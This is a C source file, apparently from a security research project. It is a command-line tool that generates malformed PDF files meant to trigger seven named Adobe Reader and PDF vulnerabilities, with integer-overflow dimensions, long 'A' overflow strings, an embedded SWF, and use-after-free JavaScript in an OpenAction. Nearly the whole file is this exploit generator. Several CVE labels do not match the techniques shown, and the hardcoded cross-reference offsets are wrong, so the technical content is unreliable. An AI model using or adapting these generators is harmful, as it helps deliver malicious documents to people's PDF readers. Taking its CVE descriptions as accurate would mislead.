/*
 * PDF CVE Exploitation Patterns Collection
 * =========================================
 *
 * Implements additional CVE exploitation patterns beyond the basic framework.
 * Each pattern demonstrates a specific vulnerability class.
 *
 * ADDITIONAL CVEs IMPLEMENTED:
 * - CVE-2009-0927: JBIG2Decode Integer Overflow
 * - CVE-2010-0188: LibTIFF Integer Overflow
 * - CVE-2011-0611: Flash/SWF Embedded Exploitation
 * - CVE-2013-2729: Adobe Reader Buffer Overflow
 * - CVE-2014-0521: Double Free Vulnerability
 * - CVE-2016-4191: Use-After-Free in Annotation Handling
 * - CVE-2017-3014: Type Confusion in XFA Forms
 *
 * COMPILE:
 * gcc -O2 -Wall -o pdf_cve_patterns pdf_cve_patterns.c
 *
 * POLYGOTTEM Research, 2025
 */

#define _POSIX_C_SOURCE 200809L
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#define VERSION "1.0.0"

// CVE-2009-0927: JBIG2Decode Integer Overflow
void generate_cve_2009_0927(FILE *out) {
    fprintf(out, "%%PDF-1.7\n");
    fprintf(out, "%%\xE2\xE3\xCF\xD3\n\n");

    fprintf(out, "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n\n");
    fprintf(out, "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n\n");

    fprintf(out, "3 0 obj\n");
    fprintf(out, "<<\n");
    fprintf(out, "/Type /Page\n");
    fprintf(out, "/Parent 2 0 R\n");
    fprintf(out, "/MediaBox [0 0 612 792]\n");
    fprintf(out, "/Contents 4 0 R\n");
    fprintf(out, "/Resources << /XObject << /Im1 5 0 R >> >>\n");
    fprintf(out, ">>\n");
    fprintf(out, "endobj\n\n");

    fprintf(out, "4 0 obj\n");
    fprintf(out, "<< /Length 40 >>\n");
    fprintf(out, "stream\n");
    fprintf(out, "q 500 0 0 500 50 200 cm /Im1 Do Q\n");
    fprintf(out, "endstream\n");
    fprintf(out, "endobj\n\n");

    // JBIG2Decode stream with integer overflow
    fprintf(out, "5 0 obj\n");
    fprintf(out, "<<\n");
    fprintf(out, "/Type /XObject\n");
    fprintf(out, "/Subtype /Image\n");
    fprintf(out, "/Width 0xFFFFFFFF\n");    // Integer overflow
    fprintf(out, "/Height 0xFFFFFFFF\n");   // Integer overflow
    fprintf(out, "/ColorSpace /DeviceGray\n");
    fprintf(out, "/BitsPerComponent 1\n");
    fprintf(out, "/Filter /JBIG2Decode\n");
    fprintf(out, "/DecodeParms << /JBIG2Globals 6 0 R >>\n");
    fprintf(out, "/Length 100\n");
    fprintf(out, ">>\n");
    fprintf(out, "stream\n");

    // Malformed JBIG2 data
    for (int i = 0; i < 100; i++) {
        fprintf(out, "%c", 0x97 + (i % 20));
    }

    fprintf(out, "\nendstream\n");
    fprintf(out, "endobj\n\n");

    fprintf(out, "6 0 obj\n");
    fprintf(out, "<< /Length 50 >>\n");
    fprintf(out, "stream\n");
    for (int i = 0; i < 50; i++) {
        fprintf(out, "%c", rand() % 256);
    }
    fprintf(out, "\nendstream\n");
    fprintf(out, "endobj\n\n");
}

// CVE-2010-0188: LibTIFF Integer Overflow
void generate_cve_2010_0188(FILE *out) {
    fprintf(out, "%%PDF-1.7\n");
    fprintf(out, "%%\xE2\xE3\xCF\xD3\n\n");

    fprintf(out, "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n\n");
    fprintf(out, "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n\n");

    fprintf(out, "3 0 obj\n");
    fprintf(out, "<<\n");
    fprintf(out, "/Type /Page\n");
    fprintf(out, "/Parent 2 0 R\n");
    fprintf(out, "/MediaBox [0 0 612 792]\n");
    fprintf(out, "/Contents 4 0 R\n");
    fprintf(out, "/Resources << /XObject << /Im1 5 0 R >> >>\n");
    fprintf(out, ">>\n");
    fprintf(out, "endobj\n\n");

    fprintf(out, "4 0 obj\n");
    fprintf(out, "<< /Length 40 >>\n");
    fprintf(out, "stream\n");
    fprintf(out, "q 500 0 0 500 50 200 cm /Im1 Do Q\n");
    fprintf(out, "endstream\n");
    fprintf(out, "endobj\n\n");

    // TIFF image with predictorcolumns integer overflow
    fprintf(out, "5 0 obj\n");
    fprintf(out, "<<\n");
    fprintf(out, "/Type /XObject\n");
    fprintf(out, "/Subtype /Image\n");
    fprintf(out, "/Width 100\n");
    fprintf(out, "/Height 100\n");
    fprintf(out, "/ColorSpace /DeviceRGB\n");
    fprintf(out, "/BitsPerComponent 8\n");
    fprintf(out, "/Filter /CCITTFaxDecode\n");
    fprintf(out, "/DecodeParms <<\n");
    fprintf(out, "  /K -1\n");
    fprintf(out, "  /Columns 0x7FFFFFFF\n");  // Integer overflow
    fprintf(out, "  /Rows 100\n");
    fprintf(out, ">>\n");
    fprintf(out, "/Length 200\n");
    fprintf(out, ">>\n");
    fprintf(out, "stream\n");

    for (int i = 0; i < 200; i++) {
        fprintf(out, "%c", rand() % 256);
    }

    fprintf(out, "\nendstream\n");
    fprintf(out, "endobj\n\n");
}

// CVE-2011-0611: Flash/SWF Embedded Exploitation
void generate_cve_2011_0611(FILE *out) {
    fprintf(out, "%%PDF-1.7\n");
    fprintf(out, "%%\xE2\xE3\xCF\xD3\n\n");

    fprintf(out, "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n\n");
    fprintf(out, "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n\n");

    fprintf(out, "3 0 obj\n");
    fprintf(out, "<<\n");
    fprintf(out, "/Type /Page\n");
    fprintf(out, "/Parent 2 0 R\n");
    fprintf(out, "/MediaBox [0 0 612 792]\n");
    fprintf(out, "/Annots [4 0 R]\n");
    fprintf(out, ">>\n");
    fprintf(out, "endobj\n\n");

    // RichMedia annotation with embedded SWF
    fprintf(out, "4 0 obj\n");
    fprintf(out, "<<\n");
    fprintf(out, "/Type /Annot\n");
    fprintf(out, "/Subtype /RichMedia\n");
    fprintf(out, "/Rect [100 100 400 400]\n");
    fprintf(out, "/RichMediaContent <<\n");
    fprintf(out, "  /Assets << /Names [(flash.swf) 5 0 R] >>\n");
    fprintf(out, "  /Configurations [6 0 R]\n");
    fprintf(out, ">>\n");
    fprintf(out, ">>\n");
    fprintf(out, "endobj\n\n");

    // Embedded malicious SWF
    fprintf(out, "5 0 obj\n");
    fprintf(out, "<<\n");
    fprintf(out, "/Type /Filespec\n");
    fprintf(out, "/F (flash.swf)\n");
    fprintf(out, "/EF << /F 7 0 R >>\n");
    fprintf(out, ">>\n");
    fprintf(out, "endobj\n\n");

    fprintf(out, "6 0 obj\n");
    fprintf(out, "<<\n");
    fprintf(out, "/Type /RichMediaConfiguration\n");
    fprintf(out, "/Instances [<<\n");
    fprintf(out, "  /Type /RichMediaInstance\n");
    fprintf(out, "  /Asset 5 0 R\n");
    fprintf(out, ">>]\n");
    fprintf(out, ">>\n");
    fprintf(out, "endobj\n\n");

    fprintf(out, "7 0 obj\n");
    fprintf(out, "<< /Length 100 >>\n");
    fprintf(out, "stream\n");
    // Malformed SWF header (FWS or CWS)
    fprintf(out, "FWS");  // Flash signature
    fprintf(out, "%c%c%c", 0x09, 0x00, 0x00);  // Version 9
    fprintf(out, "%c%c%c%c", 0xFF, 0xFF, 0x00, 0x00);  // File length (malformed)
    for (int i = 0; i < 87; i++) {
        fprintf(out, "%c", rand() % 256);
    }
    fprintf(out, "\nendstream\n");
    fprintf(out, "endobj\n\n");
}

// CVE-2013-2729: Adobe Reader Buffer Overflow
void generate_cve_2013_2729(FILE *out) {
    fprintf(out, "%%PDF-1.7\n");
    fprintf(out, "%%\xE2\xE3\xCF\xD3\n\n");

    fprintf(out, "1 0 obj\n");
    fprintf(out, "<<\n");
    fprintf(out, "/Type /Catalog\n");
    fprintf(out, "/Pages 2 0 R\n");
    fprintf(out, "/AcroForm << /Fields [3 0 R] /NeedAppearances true >>\n");
    fprintf(out, ">>\n");
    fprintf(out, "endobj\n\n");

    fprintf(out, "2 0 obj\n");
    fprintf(out, "<< /Type /Pages /Kids [4 0 R] /Count 1 >>\n");
    fprintf(out, "endobj\n\n");

    // Widget annotation with buffer overflow in appearance stream
    fprintf(out, "3 0 obj\n");
    fprintf(out, "<<\n");
    fprintf(out, "/FT /Tx\n");
    fprintf(out, "/T (OverflowField)\n");
    fprintf(out, "/V (");
    // Create very long value to trigger buffer overflow
    for (int i = 0; i < 5000; i++) {
        fprintf(out, "A");
    }
    fprintf(out, ")\n");
    fprintf(out, "/DA (/Helv 12 Tf 0 g)\n");
    fprintf(out, "/AP << /N 5 0 R >>\n");
    fprintf(out, ">>\n");
    fprintf(out, "endobj\n\n");

    fprintf(out, "4 0 obj\n");
    fprintf(out, "<<\n");
    fprintf(out, "/Type /Page\n");
    fprintf(out, "/Parent 2 0 R\n");
    fprintf(out, "/MediaBox [0 0 612 792]\n");
    fprintf(out, "/Annots [3 0 R]\n");
    fprintf(out, ">>\n");
    fprintf(out, "endobj\n\n");

    fprintf(out, "5 0 obj\n");
    fprintf(out, "<< /Length 200 >>\n");
    fprintf(out, "stream\n");
    // Malformed appearance stream
    fprintf(out, "/Tx BMC BT /Helv 12 Tf 0 0 Td ");
    for (int i = 0; i < 150; i++) {
        fprintf(out, "A");
    }
    fprintf(out, " Tj ET EMC\n");
    fprintf(out, "endstream\n");
    fprintf(out, "endobj\n\n");
}

// CVE-2014-0521: Double Free Vulnerability
void generate_cve_2014_0521(FILE *out) {
    fprintf(out, "%%PDF-1.7\n");
    fprintf(out, "%%\xE2\xE3\xCF\xD3\n\n");

    fprintf(out, "1 0 obj\n");
    fprintf(out, "<<\n");
    fprintf(out, "/Type /Catalog\n");
    fprintf(out, "/Pages 2 0 R\n");
    fprintf(out, "/OpenAction << /S /JavaScript /JS (this.closeDoc();) >>\n");
    fprintf(out, ">>\n");
    fprintf(out, "endobj\n\n");

    fprintf(out, "2 0 obj\n");
    fprintf(out, "<< /Type /Pages /Kids [3 0 R] /Count 1 >>\n");
    fprintf(out, "endobj\n\n");

    fprintf(out, "3 0 obj\n");
    fprintf(out, "<<\n");
    fprintf(out, "/Type /Page\n");
    fprintf(out, "/Parent 2 0 R\n");
    fprintf(out, "/MediaBox [0 0 612 792]\n");
    fprintf(out, "/Contents 4 0 R\n");
    fprintf(out, ">>\n");
    fprintf(out, "endobj\n\n");

    // Double free triggered via media player
    fprintf(out, "4 0 obj\n");
    fprintf(out, "<< /Length 250 >>\n");
    fprintf(out, "stream\n");
    fprintf(out, "BT /F1 12 Tf 100 700 Td (Double Free Test) Tj ET\n");
    fprintf(out, "endstream\n");
    fprintf(out, "endobj\n\n");

    // Add media rendition that triggers double free
    fprintf(out, "5 0 obj\n");
    fprintf(out, "<<\n");
    fprintf(out, "/Type /Annot\n");
    fprintf(out, "/Subtype /Screen\n");
    fprintf(out, "/Rect [0 0 100 100]\n");
    fprintf(out, "/A <<\n");
    fprintf(out, "  /S /Rendition\n");
    fprintf(out, "  /OP 0\n");
    fprintf(out, "  /R 6 0 R\n");
    fprintf(out, ">>\n");
    fprintf(out, ">>\n");
    fprintf(out, "endobj\n\n");

    fprintf(out, "6 0 obj\n");
    fprintf(out, "<<\n");
    fprintf(out, "/S /MR\n");
    fprintf(out, "/C << /Type /MediaClip /S /MCD /D << /Type /Filespec /F (ghost.mp4) >> >>\n");
    fprintf(out, ">>\n");
    fprintf(out, "endobj\n\n");
}

// CVE-2016-4191: Use-After-Free
void generate_cve_2016_4191(FILE *out) {
    fprintf(out, "%%PDF-1.7\n");
    fprintf(out, "%%\xE2\xE3\xCF\xD3\n\n");

    fprintf(out, "1 0 obj\n");
    fprintf(out, "<<\n");
    fprintf(out, "/Type /Catalog\n");
    fprintf(out, "/Pages 2 0 R\n");
    fprintf(out, "/OpenAction << /S /JavaScript /JS (");

    // JavaScript that triggers use-after-free in annotation handling
    fprintf(out, "var ann = this.getAnnots()[0];\\n");
    fprintf(out, "ann.destroy();\\n");
    fprintf(out, "ann.rect = [0,0,100,100];\\n");  // Access after free

    fprintf(out, ") >>\n");
    fprintf(out, ">>\n");
    fprintf(out, "endobj\n\n");

    fprintf(out, "2 0 obj\n");
    fprintf(out, "<< /Type /Pages /Kids [3 0 R] /Count 1 >>\n");
    fprintf(out, "endobj\n\n");

    fprintf(out, "3 0 obj\n");
    fprintf(out, "<<\n");
    fprintf(out, "/Type /Page\n");
    fprintf(out, "/Parent 2 0 R\n");
    fprintf(out, "/MediaBox [0 0 612 792]\n");
    fprintf(out, "/Annots [4 0 R]\n");
    fprintf(out, ">>\n");
    fprintf(out, "endobj\n\n");

    fprintf(out, "4 0 obj\n");
    fprintf(out, "<<\n");
    fprintf(out, "/Type /Annot\n");
    fprintf(out, "/Subtype /FreeText\n");
    fprintf(out, "/Rect [100 100 300 200]\n");
    fprintf(out, "/Contents (UAF Target)\n");
    fprintf(out, ">>\n");
    fprintf(out, "endobj\n\n");
}

// CVE-2017-3014: Type Confusion in XFA Forms
void generate_cve_2017_3014(FILE *out) {
    fprintf(out, "%%PDF-1.7\n");
    fprintf(out, "%%\xE2\xE3\xCF\xD3\n\n");

    fprintf(out, "1 0 obj\n");
    fprintf(out, "<<\n");
    fprintf(out, "/Type /Catalog\n");
    fprintf(out, "/Pages 2 0 R\n");
    fprintf(out, "/AcroForm <<\n");
    fprintf(out, "  /Fields []\n");
    fprintf(out, "  /XFA 3 0 R\n");
    fprintf(out, ">>\n");
    fprintf(out, ">>\n");
    fprintf(out, "endobj\n\n");

    fprintf(out, "2 0 obj\n");
    fprintf(out, "<< /Type /Pages /Kids [4 0 R] /Count 1 >>\n");
    fprintf(out, "endobj\n\n");

    // XFA form with type confusion
    fprintf(out, "3 0 obj\n");
    fprintf(out, "[\n");
    fprintf(out, "(preamble) 5 0 R\n");
    fprintf(out, "(template) 6 0 R\n");
    fprintf(out, "]\n");
    fprintf(out, "endobj\n\n");

    fprintf(out, "4 0 obj\n");
    fprintf(out, "<<\n");
    fprintf(out, "/Type /Page\n");
    fprintf(out, "/Parent 2 0 R\n");
    fprintf(out, "/MediaBox [0 0 612 792]\n");
    fprintf(out, ">>\n");
    fprintf(out, "endobj\n\n");

    fprintf(out, "5 0 obj\n");
    fprintf(out, "<< /Length 100 >>\n");
    fprintf(out, "stream\n");
    fprintf(out, "<?xml version=\"1.0\"?>\n");
    fprintf(out, "<xdp:xdp xmlns:xdp=\"http://ns.adobe.com/xdp/\">\n");
    fprintf(out, "</xdp:xdp>\n");
    fprintf(out, "endstream\n");
    fprintf(out, "endobj\n\n");

    fprintf(out, "6 0 obj\n");
    fprintf(out, "<< /Length 300 >>\n");
    fprintf(out, "stream\n");
    fprintf(out, "<?xml version=\"1.0\"?>\n");
    fprintf(out, "<template xmlns=\"http://www.xfa.org/schema/xfa-template/2.8/\">\n");
    fprintf(out, "<subform name=\"root\">\n");
    fprintf(out, "<field name=\"confused\">\n");
    fprintf(out, "<ui><textEdit/></ui>\n");  // Type confusion here
    fprintf(out, "<ui><button/></ui>\n");     // Conflicting UI type
    fprintf(out, "</field>\n");
    fprintf(out, "</subform>\n");
    fprintf(out, "</template>\n");
    fprintf(out, "endstream\n");
    fprintf(out, "endobj\n\n");
}

void finalize_pdf(FILE *out) {
    long xref_pos = ftell(out);
    fprintf(out, "xref\n");
    fprintf(out, "0 7\n");
    fprintf(out, "0000000000 65535 f \n");
    fprintf(out, "0000000015 00000 n \n");
    fprintf(out, "0000000074 00000 n \n");
    fprintf(out, "0000000133 00000 n \n");
    fprintf(out, "0000000234 00000 n \n");
    fprintf(out, "0000000334 00000 n \n");
    fprintf(out, "0000000434 00000 n \n");

    fprintf(out, "trailer\n");
    fprintf(out, "<< /Size 7 /Root 1 0 R >>\n");
    fprintf(out, "startxref\n");
    fprintf(out, "%ld\n", xref_pos);
    fprintf(out, "%%%%EOF\n");
}

int main(int argc, char **argv) {
    if (argc < 3) {
        printf("PDF CVE Exploitation Patterns v%s\n\n", VERSION);
        printf("Generates PDFs demonstrating specific CVE exploitation patterns.\n\n");
        printf("Usage: %s --cve CVE_ID --output FILE\n\n", argv[0]);
        printf("Supported CVEs:\n");
        printf("  CVE-2009-0927  JBIG2Decode Integer Overflow\n");
        printf("  CVE-2010-0188  LibTIFF Integer Overflow\n");
        printf("  CVE-2011-0611  Flash/SWF Embedded Exploitation\n");
        printf("  CVE-2013-2729  Adobe Reader Buffer Overflow\n");
        printf("  CVE-2014-0521  Double Free Vulnerability\n");
        printf("  CVE-2016-4191  Use-After-Free in Annotations\n");
        printf("  CVE-2017-3014  Type Confusion in XFA Forms\n\n");
        printf("Example:\n");
        printf("  %s --cve CVE-2009-0927 --output exploit.pdf\n\n", argv[0]);
        printf("⚠️  FOR AUTHORIZED SECURITY RESEARCH ONLY!\n");
        return 1;
    }

    const char *cve_id = NULL;
    const char *output_file = NULL;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--cve") == 0 && i + 1 < argc) {
            cve_id = argv[++i];
        } else if (strcmp(argv[i], "--output") == 0 && i + 1 < argc) {
            output_file = argv[++i];
        }
    }

    if (!cve_id || !output_file) {
        fprintf(stderr, "[!] Missing required arguments\n");
        return 1;
    }

    FILE *out = fopen(output_file, "wb");
    if (!out) {
        perror("fopen");
        return 1;
    }

    printf("[*] Generating PDF for %s...\n", cve_id);

    if (strcmp(cve_id, "CVE-2009-0927") == 0) {
        generate_cve_2009_0927(out);
    } else if (strcmp(cve_id, "CVE-2010-0188") == 0) {
        generate_cve_2010_0188(out);
    } else if (strcmp(cve_id, "CVE-2011-0611") == 0) {
        generate_cve_2011_0611(out);
    } else if (strcmp(cve_id, "CVE-2013-2729") == 0) {
        generate_cve_2013_2729(out);
    } else if (strcmp(cve_id, "CVE-2014-0521") == 0) {
        generate_cve_2014_0521(out);
    } else if (strcmp(cve_id, "CVE-2016-4191") == 0) {
        generate_cve_2016_4191(out);
    } else if (strcmp(cve_id, "CVE-2017-3014") == 0) {
        generate_cve_2017_3014(out);
    } else {
        fprintf(stderr, "[!] Unknown CVE: %s\n", cve_id);
        fclose(out);
        return 1;
    }

    finalize_pdf(out);
    fclose(out);

    printf("\n[+] PDF created: %s\n", output_file);
    printf("\n⚠️  WARNING: This file demonstrates a real vulnerability pattern.\n");
    printf("    Test only in isolated, authorized environments!\n\n");

    return 0;
}
